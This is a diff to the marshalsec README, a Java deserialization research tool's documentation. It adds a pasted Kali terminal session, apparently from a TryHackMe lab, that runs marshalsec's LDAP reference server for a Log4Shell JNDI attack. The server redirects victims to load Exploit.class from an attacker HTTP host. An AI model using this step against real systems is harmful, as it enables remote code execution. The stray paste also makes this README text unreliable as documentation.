@@ -4,6 +4,13 @@ If you came here for Log4Shell/CVE-2021-44228, you may want to read about
 the exploitation vectors and affected Java runtime versions:
 <https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/>
 
+┌──(kali㉿kali)-[~/thm/solar/marshalsec]
+└─$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.1.181:8000/#Exploit"
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Listening on 0.0.0.0:1389
+Send LDAP reference result for Exploit redirecting to http://10.9.1.181:8000/Exploit.class
+
+
 ## Paper
 
 It's been more than two years since Chris Frohoff and Garbriel Lawrence have presented their research into Java object deserialization vulnerabilities ultimately resulting in what can be readily described as the biggest wave of remote code execution bugs in Java history.
